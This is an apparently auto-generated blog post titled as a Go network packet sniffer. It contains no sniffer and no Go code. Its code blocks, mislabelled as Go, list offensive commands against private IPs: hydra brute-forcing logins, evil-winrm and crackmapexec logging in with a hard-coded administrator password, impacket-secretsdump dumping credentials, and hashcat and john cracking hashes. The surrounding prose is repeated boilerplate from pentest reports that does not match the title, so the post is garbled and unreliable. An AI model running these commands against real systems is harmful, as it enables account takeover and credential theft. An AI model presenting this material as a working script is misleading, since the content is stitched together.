---
TitleSEO: "Network Packet Sniffer in Go | ZureFX"
TitlePost: "Network Packet Sniffer — Go"
Author: "ZureFX"
Description: "A Go script for network packet sniffer. Built for security research and automation."
Keywords: "go, automation, bash"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-785.html"
URL_IMAGES: ""
Date: "2025-08-24"
Tags: "Go, Automation, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-785"
Permalink: "/scripting/script-network-packet-sniffer-785.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `burpsuite`
- `feroxbuster`
- `evil-winrm`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.77.58 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.23.81.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.106.218.171 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

```go
evil-winrm -i 10.96.160.110 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.139.144
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.239.242/FUZZ
nmap -sCV -p1433,25,139 10.121.142.84 -oN scan.txt
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
feroxbuster -h
crackmapexec smb 10.61.242.202 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
gobuster dir -u http://10.37.107.103/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.57.12.70 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 29.10s
```
